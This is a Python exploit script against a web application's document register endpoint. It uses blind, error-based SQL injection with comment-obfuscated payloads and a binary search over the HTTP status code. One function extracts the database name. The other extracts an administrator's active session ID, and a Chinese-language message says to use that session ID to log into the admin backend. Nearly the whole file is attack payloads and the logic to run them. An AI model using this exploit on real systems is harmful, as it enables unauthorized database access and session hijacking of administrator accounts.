import requests,re,urllib3,sys
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def dbname(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+'general/document/index.php/recv/register/insert'
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	start=0
	end=126
	dbname=''
	flag=[]
	for i in range(1,27):
		start=0
		end=126
		if len(flag)>0:
			break
		while True:
			print(i,start,end)
			mid=int((start+end)/2)
			if start+1==end:
				if start!=0 and end !=1:
					dbname+=chr(end)
					print(dbname)
					break
				else:
					flag.append(1)
					break
			data=f'title)values("\'"^exp(if(ascii(substr((select/**/database()),{i},1))>{mid},1,710)))# =1&_SERVER='
			response=requests.post(url=url, headers=headers,data=data,verify=False,timeout=5,allow_redirects=False)
			if response.status_code==302:
				start=mid
			else:
				end=mid

	print(f"当前数据库名:{dbname}")	
def session(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+'general/document/index.php/recv/register/insert'
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	start=0
	end=126
	PHPSESSID=''
	flag=[]
	for i in range(25,27):
		start=0
		end=126
		if len(flag)>0:
			break
		while True:
			print(i,start,end)
			mid=int((start+end)/2)
			if start+1==end:
				if start!=0 and end !=1:
					PHPSESSID+=chr(end)
					print(PHPSESSID)
					break
				else:
					flag.append(1)
					break
			data=f'title)values("\'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/where/**/uid/**/like/**/1/**/limit/**/0,1),{i},1))>{mid},1,710)))# =1&_SERVER='
			# data=f'title)values("\'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/where/**/uid<2/**/limit/**/0,1),{i},1))>{mid},1,710)))# =1&_SERVER='
			# data=f'title)values("\'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),{i},1))>{mid},1,710)))# =1&_SERVER='
			response=requests.post(url=url, headers=headers,data=data,verify=False,timeout=5,allow_redirects=False)
			if response.status_code==302:
				start=mid
			else:
				end=mid

	print(f"使用PHPSESSID={PHPSESSID}访问{baseurl}general/index.php登入后台")	
				# break
if __name__ == '__main__':
	url=sys.argv[1]
	# session(url)
	dbname(url)
	
